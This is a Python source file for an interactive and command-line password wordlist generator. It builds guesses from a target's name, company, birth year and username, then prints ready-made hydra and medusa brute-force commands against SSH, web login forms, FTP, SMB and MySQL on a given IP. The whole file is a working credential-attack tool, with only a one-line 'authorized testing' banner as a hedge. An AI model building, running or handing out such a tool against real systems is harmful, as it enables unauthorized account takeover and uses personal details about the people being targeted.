import itertools
import os
import sys
import time
import random
import string
import argparse
from colorama import Fore, Style, init
from datetime import datetime
from pathlib import Path

# Initialize colorama
init(autoreset=True)

# Extended configuration
service_profiles = {
    "ssh": {"technical": True, "personal": True, "dates": True, "default_port": 22},
    "web": {"technical": False, "personal": True, "dates": True, "default_port": 80},
    "ftp": {"technical": True, "personal": False, "dates": False, "default_port": 21},
    "router": {"technical": True, "personal": False, "dates": False, "default_port": 8080},
    "rdp": {"technical": True, "personal": True, "dates": True, "default_port": 3389},
    "smb": {"technical": True, "personal": False, "dates": False, "default_port": 445},
    "mysql": {"technical": True, "personal": False, "dates": False, "default_port": 3306},
    "postgresql": {"technical": True, "personal": False, "dates": False, "default_port": 5432}
}

special_chars = ["!", "@", "#", "$", "_", ".", "-", "*", "&", "+", "=", "%", "^"]
common_passwords = [
    "password", "admin", "123456", "qwerty", "letmein", "welcome", 
    "changeme", "secret", "password123", "admin123", "root", "toor",
    "administrator", "P@ssw0rd", "passw0rd", "default"
]

# Password policy parameters
PASSWORD_MIN_LENGTH = 8
PASSWORD_MAX_LENGTH = 20

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.CYAN}
╦ ╦┌─┐┬  ┌─┐┌─┐┌┬┐   ╦ ╦┌─┐┬─┐┌─┐┌─┐┌─┐┬ ┬
║║║├┤ │  │  │ ││││   ╠═╣├─┤├┬┘│  ├┤ └─┐├─┤
╚╩╝└─┘┴─┘└─┘└─┘┴ ┴   ╩ ╩┴ ┴┴└─└─┘└─┘└─┘┴ ┴
{Style.RESET_ALL}Kethan VR - Enhanced Smart Wordlist Generator v3.0
{Fore.RED}[!] WARNING: Use only for authorized security testing!{Style.RESET_ALL}

Options at any prompt:
99 - Exit program
0  - Go back to previous step
""")

def smart_input(prompt, prev_step=None, validate_func=None):
    while True:
        try:
            value = input(f"{Fore.YELLOW}{prompt}{Style.RESET_ALL}")
            if value == "99":
                print("\n🔴 Exiting...")
                sys.exit(0)
            elif value == "0" and prev_step:
                return "BACK"
            
            if validate_func and value:
                valid, message = validate_func(value)
                if not valid:
                    print(f"{Fore.RED}{message}{Style.RESET_ALL}")
                    continue
                    
            return value.strip()
        except KeyboardInterrupt:
            print("\n🔴 Operation cancelled!")
            sys.exit(0)

def validate_year(year):
    try:
        year_int = int(year)
        current_year = datetime.now().year
        if 1900 <= year_int <= current_year:
            return True, ""
        return False, f"Year must be between 1900 and {current_year}"
    except ValueError:
        return False, "Please enter a valid year (YYYY)"

def validate_ip(ip):
    # Basic validation - could be enhanced
    parts = ip.split('.')
    if len(parts) != 4:
        return False, "IP address must have 4 parts separated by dots"
    
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False, "Each part must be between 0-255"
        except ValueError:
            return False, "Each part must be a number"
    
    return True, ""

def generate_combinations(base_words, service_type, complexity_level=1):
    combinations = set(base_words)
    
    # Add common passwords
    combinations.update(common_passwords)
    
    # Service-specific generation
    if service_type in ["ssh", "router", "rdp"]:
        for combo in itertools.product(base_words, ["123", "admin", "root", "2024", "2025"]):
            combinations.add(''.join(combo))
    elif service_type in ["web", "mysql", "postgresql"]:
        for combo in itertools.product(base_words, ["pw", "pass", "secret", "2024", "admin"]):
            combinations.add(''.join(combo))
    
    # Year variations (forward and backward)
    years = []
    for word in base_words:
        if word.isdigit() and len(word) == 4:
            years.append(word)
            # Add variations like last two digits
            years.append(word[2:])
    
    current_year = datetime.now().year
    years.extend([str(current_year), str(current_year)[2:]])
    
    # Basic permutations (Level 1)
    for r in range(1, 3):
        for combo in itertools.permutations(base_words, r):
            combinations.add(''.join(combo))
    
    # Special character variations (Level 1)
    for word in base_words:
        for char in special_chars:
            combinations.add(f"{word}{char}")
            combinations.add(f"{char}{word}")
    
    # Medium complexity (Level 2)
    if complexity_level >= 2:
        # Combine words with years
        for word in base_words:
            for year in years:
                combinations.add(f"{word}{year}")
                combinations.add(f"{year}{word}")
        
        # Common letter substitutions (leet speak)
        leet_substitutions = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
        for word in base_words:
            leet_word = word
            for char, replacement in leet_substitutions.items():
                leet_word = leet_word.replace(char, replacement)
            if leet_word != word:
                combinations.add(leet_word)
    
    # High complexity (Level 3)
    if complexity_level >= 3:
        # Multiple special chars
        for word in base_words:
            for char1, char2 in itertools.product(special_chars, repeat=2):
                combinations.add(f"{char1}{word}{char2}")
        
        # Capitalize variations
        for word in base_words:
            if len(word) > 1:
                combinations.add(word.capitalize())
                combinations.add(word.upper())
                
                # Alternate case
                alt_word = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word)])
                combinations.add(alt_word)
    
    # Filter by length requirements
    filtered_combinations = {pw for pw in combinations if PASSWORD_MIN_LENGTH <= len(pw) <= PASSWORD_MAX_LENGTH}
    
    return filtered_combinations

def filter_wordlist(wordlist, min_length=8, max_length=20, must_contain=None):
    """Filter wordlist based on password policy"""
    filtered = set()
    
    for word in wordlist:
        if min_length <= len(word) <= max_length:
            if must_contain:
                # Check if all required character types are present
                meets_criteria = True
                for criteria in must_contain:
                    if criteria == 'uppercase' and not any(c.isupper() for c in word):
                        meets_criteria = False
                    elif criteria == 'lowercase' and not any(c.islower() for c in word):
                        meets_criteria = False
                    elif criteria == 'digit' and not any(c.isdigit() for c in word):
                        meets_criteria = False
                    elif criteria == 'special' and not any(c in special_chars for c in word):
                        meets_criteria = False
                
                if meets_criteria:
                    filtered.add(word)
            else:
                filtered.add(word)
    
    return filtered

def show_progress_bar(current, total, prefix='', suffix='', length=50):
    percent = float(current) / total
    filled_length = int(length * percent)
    bar = '█' * filled_length + '░' * (length - filled_length)
    
    sys.stdout.write(f'\r{prefix} |{bar}| {percent:.1%} {suffix}')
    sys.stdout.flush()
    
    if current == total:
        print()

def save_wordlist(wordlist, filename):
    """Save wordlist to file with error handling"""
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        with open(filename, "w") as f:
            f.write('\n'.join(wordlist))
        return True, f"✅ Successfully generated {len(wordlist)} entries in {filename}"
    except Exception as e:
        return False, f"❌ Error saving file: {str(e)}"

def analyze_wordlist(wordlist):
    """Provide basic analysis of the generated wordlist"""
    if not wordlist:
        return "Empty wordlist"
    
    analysis = {
        "total": len(wordlist),
        "avg_length": sum(len(word) for word in wordlist) / len(wordlist),
        "min_length": min(len(word) for word in wordlist),
        "max_length": max(len(word) for word in wordlist),
        "with_special": sum(1 for word in wordlist if any(c in special_chars for c in word)),
        "with_digits": sum(1 for word in wordlist if any(c.isdigit() for c in word)),
        "with_uppercase": sum(1 for word in wordlist if any(c.isupper() for c in word)),
        "common_passwords": sum(1 for word in wordlist if word.lower() in common_passwords)
    }
    
    return f"""
{Fore.CYAN}📊 Wordlist Analysis:{Style.RESET_ALL}
• Total passwords: {analysis['total']}
• Average length: {analysis['avg_length']:.1f} characters
• Length range: {analysis['min_length']} to {analysis['max_length']} characters
• Passwords with special chars: {analysis['with_special']} ({analysis['with_special']/analysis['total']*100:.1f}%)
• Passwords with digits: {analysis['with_digits']} ({analysis['with_digits']/analysis['total']*100:.1f}%)
• Passwords with uppercase: {analysis['with_uppercase']} ({analysis['with_uppercase']/analysis['total']*100:.1f}%)
• Common passwords included: {analysis['common_passwords']}
"""

def suggest_attack_command(service, target_info, wordlist_file):
    """Suggest appropriate attack commands based on the service"""
    commands = []
    
    if service == "ssh" and 'host_ip' in target_info and 'username' in target_info:
        port = target_info.get('port', service_profiles[service]['default_port'])
        commands.append(
            f"hydra -l {target_info['username']} -P {wordlist_file} "
            f"-s {port} {target_info['host_ip']} ssh"
        )
        commands.append(
            f"medusa -h {target_info['host_ip']} -u {target_info['username']} "
            f"-P {wordlist_file} -M ssh -n {port}"
        )
    
    elif service == "web" and 'host_ip' in target_info:
        port = target_info.get('port', service_profiles[service]['default_port'])
        form_path = "/login.php"  # Example path
        commands.append(
            f"hydra -l {target_info.get('username', 'admin')} -P {wordlist_file} "
            f"{target_info['host_ip']} http-post-form \"{form_path}:username=^USER^&password=^PASS^:Invalid\""
        )
    
    elif service == "ftp" and 'host_ip' in target_info:
        port = target_info.get('port', service_profiles[service]['default_port'])
        commands.append(
            f"hydra -l {target_info.get('username', 'anonymous')} -P {wordlist_file} "
            f"-s {port} {target_info['host_ip']} ftp"
        )
    
    elif service == "smb" and 'host_ip' in target_info:
        commands.append(
            f"hydra -l {target_info.get('username', 'administrator')} -P {wordlist_file} "
            f"{target_info['host_ip']} smb"
        )
        
    elif service == "mysql" and 'host_ip' in target_info:
        port = target_info.get('port', service_profiles[service]['default_port'])
        commands.append(
            f"hydra -l {target_info.get('username', 'root')} -P {wordlist_file} "
            f"{target_info['host_ip']} mysql -s {port}"
        )
        
    if commands:
        result = f"\n{Fore.GREEN}Suggested attack commands:{Style.RESET_ALL}\n"
        for i, cmd in enumerate(commands, 1):
            result += f"{i}. {cmd}\n"
        return result
    
    return ""

def handle_cli_args():
    """Handle command line arguments for non-interactive mode"""
    parser = argparse.ArgumentParser(description="Enhanced Smart Wordlist Generator")
    parser.add_argument("--service", choices=service_profiles.keys(), help="Target service type")
    parser.add_argument("--ip", help="Target IP address")
    parser.add_argument("--username", help="Target username")
    parser.add_argument("--firstname", help="Target's first name")
    parser.add_argument("--lastname", help="Target's last name")
    parser.add_argument("--year", help="Target's birth year")
    parser.add_argument("--company", help="Target's company name")
    parser.add_argument("--complexity", type=int, choices=[1, 2, 3], default=2, 
                        help="Password complexity level (1=basic, 2=medium, 3=advanced)")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--min-length", type=int, default=8, help="Minimum password length")
    parser.add_argument("--max-length", type=int, default=20, help="Maximum password length")
    
    args = parser.parse_args()
    
    # Check if we have enough args for non-interactive mode
    if args.service and (args.ip or args.username or args.firstname):
        return args
    
    return None

def generate_targeted_passwords(base_words):
    """Generate targeted password variations"""
    targeted = set()
    
    # Combine words in different ways
    for w1, w2 in itertools.permutations(base_words, 2):
        targeted.add(f"{w1}{w2}")
        targeted.add(f"{w1.capitalize()}{w2}")
        targeted.add(f"{w1}{w2.capitalize()}")
        
        # Add common separators
        for sep in ['.', '_', '-', '@']:
            targeted.add(f"{w1}{sep}{w2}")
    
    # Add common patterns with numbers
    common_numbers = ['123', '1234', '12345', '123456', '2024', '2025']
    for word in base_words:
        for num in common_numbers:
            targeted.add(f"{word}{num}")
            targeted.add(f"{num}{word}")
            
    return targeted

def main_flow():
    # Check for CLI arguments
    cli_args = handle_cli_args()
    if cli_args:
        # Non-interactive mode
        service = cli_args.service
        target_info = {
            "service_profile": service_profiles[service],
            "host_ip": cli_args.ip or "",
            "username": cli_args.username or "",
            "first_name": cli_args.firstname or "",
            "last_name": cli_args.lastname or "",
            "year": cli_args.year or "",
            "company": cli_args.company or ""
        }
        complexity_level = cli_args.complexity
        min_length = cli_args.min_length
        max_length = cli_args.max_length
        output_file = cli_args.output or f"results/{service}_wordlist_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        # Use only non-empty values
        base_words = [v for k, v in target_info.items() if isinstance(v, str) and v and k != "service_profile"]
        
        print(f"{Fore.CYAN}Running in non-interactive mode{Style.RESET_ALL}")
        print(f"Service: {service}")
        print(f"Using {len(base_words)} input words with complexity level {complexity_level}")
        
        # Generate wordlist
        print(f"{Fore.YELLOW}Generating combinations...{Style.RESET_ALL}")
        combinations = generate_combinations(base_words + common_passwords, service, complexity_level)
        targeted = generate_targeted_passwords(base_words)
        combinations.update(targeted)
        
        # Filter by length
        print(f"{Fore.YELLOW}Applying filters...{Style.RESET_ALL}")
        filtered = filter_wordlist(combinations, min_length, max_length)
        
        # Save wordlist
        success, message = save_wordlist(filtered, output_file)
        print(message)
        
        if success:
            print(analyze_wordlist(filtered))
            print(suggest_attack_command(service, target_info, output_file))
        
        sys.exit(0)
    
    # Interactive mode
    show_banner()
    target_info = {}
    
    # Service detection
    while True:
        print(f"{Fore.CYAN}Available services:{Style.RESET_ALL}")
        for i, service in enumerate(service_profiles.keys(), 1):
            print(f"{i}. {service} (Port: {service_profiles[service]['default_port']})")
        
        service_choice = smart_input("🌐 Enter service number or name: ").lower()
        
        # Handle numeric choice
        if service_choice.isdigit():
            idx = int(service_choice) - 1
            if 0 <= idx < len(service_profiles):
                service = list(service_profiles.keys())[idx]
                target_info["service_profile"] = service_profiles[service]
                target_info["service"] = service
                break
        # Handle direct service name
        elif service_choice in service_profiles:
            target_info["service_profile"] = service_profiles[service_choice]
            target_info["service"] = service_choice
            break
        
        print(f"{Fore.RED}Invalid service! Choose from the list.")
    
    print(f"{Fore.GREEN}Selected service: {target_info['service']}{Style.RESET_ALL}")
    
    # Dynamic questioning
    sections = [
        ("🖥️ Enter target IP: ", "host_ip", True, validate_ip),
        ("🔌 Enter custom port (press Enter for default): ", "port", True, None),
        ("👤 Enter known username: ", "username", target_info["service_profile"]["technical"], None),
        ("1️⃣ Enter first name: ", "first_name", target_info["service_profile"]["personal"], None),
        ("2️⃣ Enter last name: ", "last_name", target_info["service_profile"]["personal"], None),
        ("🏢 Enter company name: ", "company", target_info["service_profile"]["personal"], None),
        ("8️⃣ Enter birth year (YYYY): ", "year", target_info["service_profile"]["dates"], validate_year)
    ]
    
    for prompt, key, condition, validator in sections:
        if not condition:
            continue
        
        while True:
            result = smart_input(prompt, prev_step=True, validate_func=validator)
            if result == "BACK":
                # Logic to go back to previous field could be implemented here
                break
            
            # If port is empty, use default
            if key == "port" and not result:
                target_info[key] = service_profiles[target_info["service"]]["default_port"]
            else:
                target_info[key] = result
            break
    
    # Custom wordlist complexity
    print(f"\n{Fore.CYAN}Select complexity level:{Style.RESET_ALL}")
    print("1. Basic (fewer combinations, faster)")
    print("2. Medium (balanced approach)")
    print("3. Advanced (more combinations, slower)")
    
    while True:
        complexity = smart_input("Select level (1-3): ", prev_step=True)
        if complexity in ["1", "2", "3"]:
            complexity_level = int(complexity)
            break
        print(f"{Fore.RED}Please select a valid option (1-3){Style.RESET_ALL}")
    
    # Custom password policy
    print(f"\n{Fore.CYAN}Password Policy Settings:{Style.RESET_ALL}")
    
    while True:
        min_len = smart_input(f"Minimum password length [8]: ", prev_step=True)
        if not min_len:
            min_len = "8"
        
        if min_len.isdigit() and 1 <= int(min_len) <= 50:
            min_length = int(min_len)
            break
        print(f"{Fore.RED}Please enter a valid number between 1 and 50{Style.RESET_ALL}")
    
    while True:
        max_len = smart_input(f"Maximum password length [20]: ", prev_step=True)
        if not max_len:
            max_len = "20"
        
        if max_len.isdigit() and int(max_len) >= min_length:
            max_length = int(max_len)
            break
        print(f"{Fore.RED}Please enter a number greater than minimum length{Style.RESET_ALL}")
    
    # Generate wordlist
    print(f"\n{Fore.YELLOW}Generating password combinations...{Style.RESET_ALL}")
    
    # Extract base words
    base_words = [v for k, v in target_info.items() 
                if isinstance(v, str) and v and k not in ["service", "service_profile"]]
    
    # Add context-specific words
    if "company" in target_info and target_info["company"]:
        company = target_info["company"]
        base_words.append(company.lower())
        base_words.append(company.replace(" ", "").lower())
    
    # Generation progress simulation
    total_steps = 3
    for i in range(total_steps):
        for j in range(101):
            show_progress_bar(j, 100, prefix=f'Step {i+1}/{total_steps}', suffix='Complete', length=40)
            time.sleep(0.001)  # Very short sleep to show progress
    
    # Actually generate combinations
    combinations = generate_combinations(base_words, target_info["service"], complexity_level)
    
    # Generate targeted passwords based on collected information
    targeted = generate_targeted_passwords(base_words)
    combinations.update(targeted)
    
    # Filter by password policy
    filtered = filter_wordlist(combinations, min_length, max_length)
    
    # Save output
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    default_filename = f"results/{target_info['service']}_{timestamp}_wordlist.txt"
    
    # Create results directory if it doesn't exist
    os.makedirs("results", exist_ok=True)
    
    print(f"\n{Fore.CYAN}Ready to save wordlist{Style.RESET_ALL}")
    print(f"💾 Default save location: {default_filename}")
    custom_filename = smart_input("💾 Enter custom filename or press Enter to use default: ")
    filename = custom_filename if custom_filename else default_filename
    
    # Save wordlist with progress indication
    print(f"\n{Fore.YELLOW}Saving wordlist...{Style.RESET_ALL}")
    success, message = save_wordlist(filtered, filename)
    print(message)
    
    if success:
        # Provide wordlist analysis
        print(analyze_wordlist(filtered))
        
        # Attack command suggestions
        command_suggestions = suggest_attack_command(target_info["service"], target_info, filename)
        if command_suggestions:
            print(command_suggestions)
        
        # Ask if user wants to view a sample
        sample_choice = smart_input("\nView a sample of generated passwords? (y/n): ")
        if sample_choice.lower() == 'y':
            sample_size = min(10, len(filtered))
            sample = random.sample(list(filtered), sample_size)
            print(f"\n{Fore.CYAN}Sample passwords:{Style.RESET_ALL}")
            for i, pwd in enumerate(sample, 1):
                print(f"{i}. {pwd}")

if __name__ == "__main__":
    try:
        main_flow()
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        print(f"If this issue persists, please report it with the following details:")
        print(f"Error type: {type(e).__name__}")
        print(f"Python version: {sys.version}")
        sys.exit(1)